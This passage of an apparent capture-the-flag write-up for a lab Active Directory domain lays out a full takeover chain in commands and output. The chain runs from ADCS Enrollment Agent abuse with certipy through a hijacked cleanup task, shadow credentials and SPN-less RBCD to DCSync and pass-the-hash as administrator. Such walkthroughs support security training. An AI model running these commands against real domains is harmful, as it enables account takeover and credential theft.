With ticket for fernando in hand I'm now ready to exploit the Enrollment Agent template. To pick a target to compromise I'll enumerate users belonging to the `Domain Employees` group:
```powershell
(Get-ADGroupMember -Identity "Domain Employees").SamAccountName
```
![alt](resources/Pasted%20image%2020241127223254.png)

This is quite a large group, but the one that sticks out to me is `ashley.b`. If we remember from our enumeration in Department shares `ashley.b` had access to a powershell script she could run from her home directory. Bloodhound enumeration also revealed she has the `CanPSRemote` privilege, meaning I can login similiar to `auditor`.

To compromise Ashley I'll need to perform a series of steps. The first step is to request a certificate from the `EnrollmentAgent` template for Fernando:
```bash
certipy req -k -u fernando.r@hades.htb -target dc.hades.htb -ca "CA-HADES" -template "EnrollmentAgent"
```

This successfully grants me the certificate:

![alt](resources/Pasted%20image%2020241127224227.png)

The way issued Enrollment Agent certificates work is they allow us to enroll on behalf of users for any template whose [msPKI-Template-Schema-Version](https://learn.microsoft.com/en-us/windows/win32/adschema/a-mspki-template-schema-version) is schema version 1. Schema versions of 2 and higher require specific configurations to allow us to enroll on behalf of other users, so an easy template to target here is the `User` template. This template is present by default in ADCS and allows any Authenticated User (Fernando in this case) to enroll.

I'll ask the KDC to give me a `User` certificate for `ashley.b` and present the Enrollment Agent certificate it gave me earlier in the request:
```bash
certipy req -k -u fernando.r@hades.htb -target dc.hades.htb -ca "CA-HADES" -template "User" -on-behalf-of 'HADES\ashley.b' -pfx fernando.r.pfx
```

This actually results in an error:

```bash
[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80010117 - RPC_E_CALL_COMPLETE - Call context cannot be accessed after call completed.
```

Researching this error on certipy's GitHub issue list finds a [pull request](https://github.com/ly4k/Certipy/pull/201) which addresses the issue. Since we are working with a restricted enrollment agent, we'll need to use dcom instead of RPC. If we clone the code mentioned in the pull and re-run the command, this time specifying the `-dcom` switch, the process will work as expected:

```bash
certipy req -k -u fernando.r@hades.htb -target dc.hades.htb -ca "CA-HADES" -template "User" -on-behalf-of 'HADES\ashley.b' -pfx fernando.r.pfx -dcom
```
![alt](resources/Pasted%20image%2020241127230344.png)

Now I have a certificate for `ashley.b` which allows client authentication. I can use this to authenticate to winrm, but first I'll need to extract the private key and certificate from the `pfx` file. I can use openssl to do this like so:
```bash
openssl pkcs12 -in ashley.b.pfx -nocerts -out private.key -nodes
openssl pkcs12 -in ashley.b.pfx -clcerts -nokeys -out cert.crt
```

Now I can authenticate to winrm using the certificate and private key:
```bash
evil-winrm -S -i dc.hades.htb -c cert.crt -k private.key
```
![alt](resources/Pasted%20image%2020241127231137.png)

### Enumeration as Ashley

Ashley's Desktop directory contains the password cleanup script that we enumerated earlier from SMB. It appears to be linked to a scheduled task called "Password Cleanup":

![alt](resources/Pasted%20image%2020241128192213.png)

There's an interesting email conversation between Ashley and a member of the Domain Administrators saved in the `Mail` directory:

![alt](resources/Pasted%20image%2020241128204322.png)

This is talking about a very similiar scenario we encountered before with the `IIS_Administrator` being blocked from inheriting our permissions. Further looking around I discover a non-standard directory `C:\Users\ashley.b\Scripts`:

![alt](resources/Pasted%20image%2020241128204547.png)

It appears to be the source code of the script behind the "Password Cleanup" scheduled task:

```powershell
function CanPasswordChangeIn {
	param ($ace)
	if($ace.ActiveDirectoryRights -match "ExtendedRight|GenericAll"){
		return $true
	}
	return $false
}
function CanChangePassword {
	param ($target, $object)
	$acls = (Get-Acl -Path "AD:$target").Access
	foreach($ace in $acls){
		if(($ace.IdentityReference -eq $object) -and (CanPasswordChangeIn $ace)){
			return $true
		}
	}
	return $false
}
function CleanArtifacts {
	param($Object)
	Set-ADObject -Identity $Object -Clear "adminCount"
	$acl = Get-Acl -Path "AD:$Object"
	$acl.SetAccessRuleProtection($False, $False)
	Set-Acl -Path "AD:$Object" -AclObject $acl
}
$group = "HADES\IT Support"
$objects = (Get-ADObject -Filter * -SearchBase "OU=DCHADES,DC=HADES,DC=HTB").DistinguishedName
$Path = "C:\Users\ashley.b\Scripts\log.txt"
Set-Content -Path $Path -Value ""

foreach($object in $objects){
	if(CanChangePassword $object $group){
		$Members = (Get-ADObject -Filter * -SearchBase $object | 
		Where-Object { $_.DistinguishedName -ne $object }).DistinguishedName
		
		foreach($DN in $Members){
			try { CleanArtifacts $DN }
			catch { $_.Exception.Message | Out-File $Path -Append }
			"Cleanup : $DN" | Out-File $Path -Append
		}
	}
}
```

This line looks particularly interesting:
```powershell
Set-ADObject -Identity $Object -Clear "adminCount"
```

Reading over the code, it looks like the script will iterate over each Active Directory $object (think users, computers and groups) inside the container `OU=DCHADES,DC=HADES,DC=HTB` (or its children). It will then check if `IT Support` has password changing permissions against that $object. In this case, "password permissions" are defined as: `Extended Right` or `Generic All`. If `IT Support` has either of those permissions against $object, then the script will run `CleanArtifacts`, which will remove the adminCount property and re-enable inheritance on the object. 
### Compromising IIS_Administrator

This script can be abused because as auditor we have the ability to write to the dacl of the `Forest Migration` Department, meaning we can specify any arbitrary ACL on that OU for any Active Directory user or group in the domain.  If we were to give the `IT Support` group full control over the `Forest Migration` OU, then the next time we run the script the `CanChangePassword()` function will match true against ALL users in that department, thus allowing adminCount to be cleared. 

As auditor, I'll give `IT Support` full control over `Forest Migration`:
```bash
bloodyAD -k -u auditor -d hades.htb --host dc.hades.htb add genericAll "OU=Forest Migration,OU=DCHADES,DC=hades,DC=htb" "IT Support"
```
![alt](resources/Pasted%20image%2020241128211836.png)

Now as Ashley, I'll run the script again by triggering the scheduled task:
```powershell
Start-ScheduledTask -TaskName "Password Cleanup"
```

As Auditor, I'll reapply my permissions on the OU to give myself Full Control over all descendant objects:
```bash
bloodyAD -k -u auditor -d hades.htb --host dc.hades.htb add genericAll "OU=Forest Migration,OU=DCHADES,DC=hades,DC=htb" auditor
```
![alt](resources/Pasted%20image%2020241127222644.png)

Now as auditor I should successfully be able to add a shadow credential to `IIS_Administrator`:
```bash
certipy shadow add -k -u auditor@hades.htb -account iis_administrator -target dc.hades.htb
```

It's successful this time, meaning the script worked:

```bash
[*] Successfully added Key Credential with device ID '354c7739-352b-a648-40c7-bde96904605e' to the Key Credentials for 'iis_administrator'
[*] Saved certificate and private key to 'iis_administrator.pfx'
```

Objects in this OU are disabled, so I have to enable `IIS_Administrator` before I can authenticate as them:
```powershell
Enable-ADAccount -Identity IIS_Administrator
```

Now run:
```bash
certipy auth -pfx iis_administrator.pfx -username iis_administrator -domain hades.htb
```

And now I finally have a ticket for `IIS_Administrator`:

![alt](resources/Pasted%20image%2020241128225422.png)

# Privilege Escalation

Now we have compromised `IIS_Administrator`, we are ready to proceed with the next phase of the attack:

![alt](resources/Pasted%20image%2020241128230057.png)

The `IIS_Webserver$` service has the `AllowedToAct` edge against the DC. This means that the webserver account has been delegated Resource Based Constrained Delegation (RBCD) rights against the domain controller. One thing we need to keep in mind is that an SPN is required to perform the traditional methods of this attack:

![alt](resources/Pasted%20image%2020241129095206.png)

Enumerating a list of users in the domain with SPNs, `IIS_Webserver$` does not appear:
```powershell
(Get-ADObject -Filter * -Properties * | Where-Object { $_.ServicePrincipalName }).SamAccountName
--------------------------
DC$
krbtgt
```

The typical approach to abuse this attack is to create a computer on the domain, give it RBCD rights and use its SPN for impersonation. The machine account quota is 0 on this domain, and we don't have permission to write object properties on the domain controller or the user with delegation rights, so we'll need to use a different method to abuse this.

There's a lesser-known attack we can use here even without an SPN. [This](https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html) blogpost does a great job explaining how the trick works. The first step is to change the password of `IIS_Webserver$`:
```bash
bloodyAD -k -u iis_administrator -d hades.htb --host dc.hades.htb set password iis_webserver$ Passw0rd!
```
![alt](resources/Pasted%20image%2020241129102049.png)

Now I want to request a Ticket Granting Ticket (TGT) for the webserver account but use its NTLM hash for authentication. This will force the use of `rc4_hmac` as the encryption method, which will be important later. First I'll get get NT hash of the newly set password:
```bash
pypykatz crypto nt "Passw0rd!"
---------------------
"fc525c9683e8fe067095ba2ddc971889"
```

Now I'll ask the KDC to give me a TGT for the webserver, using their hash for authentication:
```bash
getTGT.py hades.htb/iis_webserver$ -hashes :fc525c9683e8fe067095ba2ddc971889
---------------
[*] Saving ticket in iis_webserver$.ccache
```

Now I'll run the following on the saved ticket ccache file:
```bash
describeTicket.py 'iis_webserver$.ccache'
```
![alt](resources/Pasted%20image%2020241129103606.png)

The KDC has used `rc4_hmac` to encrypt the session key. What this means is that the session key is just a random security blob that has been encrypted with our NT hash, and because of this it matches the structure of a valid NTLM hash in Windows. The next step will be to change the password of the webserver account again, but this time we'll update its NTLM hash to be the same as this session key in the ticket:
```bash
changepasswd.py -k -altuser iis_administrator@dc.hades.htb -no-pass -newhashes :fdaf375027b557ac28758b005e61a13c 'hades.htb/iis_webserver$:Passw0rd!@dc.hades.htb'
----------------------
[*] Changing the password of hades.htb\iis_webserver$
[*] Connecting to DCE/RPC as hades.htb\iis_administrator@dc.hades.htb
[*] Password was changed successfully.
```

Because we've changed the webserver's NTLM hash to a valid service ticket key, the KDC will be tricked into allowing us to impersonate other users through u2u authentication as though we had a valid SPN. This will allow us to obtain a service ticket for the Domain Controller user `DC$`:
```bash
export KRB5CCNAME='iis_webserver$.ccache'
getST.py -k -no-pass -impersonate 'DC$' -spn 'host/dc.hades.htb' -u2u 'hades.htb/iis_webserver$'
----------------
[*] Impersonating DC$
[*] Requesting S4U2self+U2U
[*] Requesting S4U2Proxy
[*] Saving ticket in DC$@host_dc.hades.htb@HADES.HTB.ccache
```

With this service ticket we can now present ourselves as though we were the Domain Controller, allowing us to perform the DC-Sync attack:
```bash
secretsdump.py -k dc.hades.htb
```
![alt](resources/Pasted%20image%2020241129110244.png)

This dumps the NTLM hash of the administrator user, which we can then use in a pass the hash attack to obtain a kerberos ticket for authentication:
```bash
getTGT.py hades.htb/administrator -hashes "aad3b435b51404eeaad3b435b51404ee:061dccda9fcf2cdef5b9c9071cdc89f8"
--------------------
[*] Saving ticket in administrator.ccache
```

Administrator ticket in hand, I can now login to winrm and obtain `root.txt`:
```bash
evil-winrm -i dc.hades.htb -r hades.htb -S
```
![alt](resources/Pasted%20image%2020241129111058.png)

